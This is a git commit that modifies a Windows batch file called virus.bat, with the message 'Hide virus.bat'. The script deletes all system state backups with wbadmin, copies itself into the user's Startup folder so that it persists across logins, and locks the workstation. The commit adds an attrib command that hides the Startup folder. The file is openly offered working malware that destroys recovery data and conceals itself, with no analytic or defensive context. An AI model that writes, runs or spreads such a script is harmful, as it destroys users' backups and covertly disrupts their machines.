c6f9aeedaefb447e2eaa1857ae04c08b420c7538
Leandro23112007 <146172637+Leandro23112007@users.noreply.github.com>
2024-12-18 10:50:08 +0000

    Hide virus.bat

--- virus.bat
+++ virus.bat
@@ -1,8 +1,10 @@
 @echo off
 wbadmin delete systemstatebackup -keepVersions:0
 echo %USERNAME%
+@echo off
 for /r C:\ %%f in (virus.bat) do (
     move "%%f" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    attrib +h +s "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
     rundll32.exe user32.dll,LockWorkStation
 )
 
